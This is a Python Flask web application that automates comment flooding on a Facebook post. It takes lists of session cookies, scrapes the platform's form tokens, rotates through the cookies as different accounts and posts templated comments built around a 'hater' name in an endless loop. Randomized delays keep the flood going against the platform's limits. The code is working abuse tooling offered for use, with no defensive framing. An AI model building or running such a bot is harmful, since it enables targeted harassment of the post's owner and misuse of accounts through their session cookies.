from flask import Flask, render_template, request, jsonify
import requests
import os
import re
import time
import threading
import random
import string
import json
from datetime import datetime
from requests.exceptions import RequestException
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)

# Global variables to manage tasks
active_tasks = {}
task_lock = threading.Lock()

class FacebookCommenter:
    def __init__(self, task_id):
        self.task_id = task_id
        self.comment_count = 0
        self.start_time = datetime.now()
        self.is_running = True
        self.last_status = "Initializing"
        self.comment_loop = True
        
    def stop_task(self):
        self.is_running = False
        self.comment_loop = False
        
    def get_status(self):
        return {
            "status": "running" if self.is_running else "stopped",
            "comment_count": self.comment_count,
            "uptime": str(datetime.now() - self.start_time),
            "last_status": self.last_status
        }
    
    def extract_post_id(self, url):
        """Extract post ID from various Facebook URL formats"""
        try:
            # Standard post URL pattern
            if "/posts/" in url:
                return re.search(r'/posts/([^/?]+)', url).group(1)
            
            # Photo/video post pattern
            elif "/photos/" in url or "/videos/" in url:
                return re.search(r'fbid=([0-9]+)', url).group(1)
            
            # Permalink/story pattern
            elif "/permalink.php" in url or "/story.php" in url:
                return re.search(r'story_fbid=([0-9]+)', url).group(1)
            
            # Fallback - numeric post ID
            match = re.search(r'/([0-9]+)/?$', url)
            if match:
                return match.group(1)
                
            return None
        except Exception as e:
            self.last_status = f"URL Error: {str(e)}"
            return None

    def parse_cookies(self, cookie_input):
        """Handle both raw cookies and JSON format"""
        try:
            # Try to parse as JSON
            cookie_data = json.loads(cookie_input)
            if isinstance(cookie_data, dict):
                return "; ".join(f"{k}={v}" for k, v in cookie_data.items())
            elif isinstance(cookie_data, list):
                return [self.parse_cookies(c) for c in cookie_data]
            return cookie_input.strip()
        except json.JSONDecodeError:
            # Treat as raw cookie string
            return cookie_input.strip()

    def verify_cookies(self, cookies):
        """Check if cookies provide valid login"""
        try:
            response = requests.get(
                'https://mbasic.facebook.com/me',
                cookies={"cookie": cookies},
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=10,
                allow_redirects=False
            )
            return response.status_code == 200 and 'c_user' in cookies
        except:
            return False

    def comment_on_post(self, cookies, post_url, comment, hater_name, last_name):
        try:
            post_id = self.extract_post_id(post_url)
            if not post_id:
                self.last_status = "Invalid post URL"
                return False

            parsed_cookies = self.parse_cookies(cookies)
            if not self.verify_cookies(parsed_cookies):
                self.last_status = "Invalid cookies"
                return False

            session = requests.Session()
            session.cookies.update({"cookie": parsed_cookies})
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
                'Referer': post_url
            })

            # Load post page
            mbasic_url = f'https://mbasic.facebook.com/{post_id}'
            response = session.get(mbasic_url)
            
            # Find comment form
            fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
            jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
            
            if not fb_dtsg or not jazoest:
                self.last_status = "Form fields missing"
                return False

            # Submit comment
            formatted_comment = f"{hater_name} {comment.strip()} {last_name}"
            response = session.post(
                'https://mbasic.facebook.com/a/comment.php',
                data={
                    'fb_dtsg': fb_dtsg.group(1),
                    'jazoest': jazoest.group(1),
                    'comment_text': formatted_comment
                },
                headers={'Content-Type': 'application/x-www-form-urlencoded'}
            )

            if response.status_code == 200:
                self.comment_count += 1
                self.last_status = f"Posted: {formatted_comment}"
                return True
            else:
                self.last_status = f"Failed ({response.status_code})"
                return False

        except Exception as e:
            self.last_status = f"Error: {str(e)}"
            return False

    def run_task(self, config):
        try:
            cookies = config['cookies']
            post_url = config['post_url']
            comments = config['comments']
            delay = config['delay']
            hater_name = config['hater_name']
            last_name = config['last_name']
            
            cookie_index = 0
            comment_index = 0
            
            while self.is_running and self.comment_loop:
                current_cookie = cookies[cookie_index % len(cookies)]
                current_comment = comments[comment_index % len(comments)]
                
                self.comment_on_post(current_cookie, post_url, current_comment, hater_name, last_name)
                
                comment_index += 1
                cookie_index += 1
                time.sleep(max(5, delay + random.uniform(-2, 2)))  # Minimum 5 sec delay
                
        except Exception as e:
            self.last_status = f"Task Error: {str(e)}"
        finally:
            with task_lock:
                if self.task_id in active_tasks:
                    del active_tasks[self.task_id]

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        # Get input data
        cookies = request.form.get('cookies', '').splitlines()
        comments = request.form.get('comments', '').splitlines()
        post_url = request.form.get('post_url', '').strip()
        hater_name = request.form.get('hater_name', '').strip()
        last_name = request.form.get('last_name', '').strip()
        delay = int(request.form.get('delay', 10))
        
        # Validate
        if not all([cookies, comments, post_url, hater_name, last_name]):
            return jsonify({'status': 'error', 'message': 'All fields are required'})
        
        # Create task
        task_id = ''.join(random.choices(string.digits, k=8))
        config = {
            'cookies': [c.strip() for c in cookies if c.strip()],
            'comments': [c.strip() for c in comments if c.strip()],
            'post_url': post_url,
            'hater_name': hater_name,
            'last_name': last_name,
            'delay': delay
        }
        
        commenter = FacebookCommenter(task_id)
        thread = threading.Thread(target=commenter.run_task, args=(config,))
        thread.daemon = True
        thread.start()
        
        with task_lock:
            active_tasks[task_id] = commenter
        
        return jsonify({
            'status': 'success',
            'task_id': task_id,
            'message': f'Task {task_id} started'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stop_task/<task_id>', methods=['POST'])
def stop_task(task_id):
    with task_lock:
        if task_id in active_tasks:
            active_tasks[task_id].stop_task()
            return jsonify({'status': 'success', 'message': f'Task {task_id} stopped'})
        return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/task_status/<task_id>')
def task_status(task_id):
    with task_lock:
        if task_id in active_tasks:
            return jsonify({'status': 'success', 'data': active_tasks[task_id].get_status()})
        return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/active_tasks')
def get_active_tasks():
    with task_lock:
        return jsonify({
            'status': 'success',
            'data': {task_id: task.get_status() for task_id, task in active_tasks.items()}
        })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
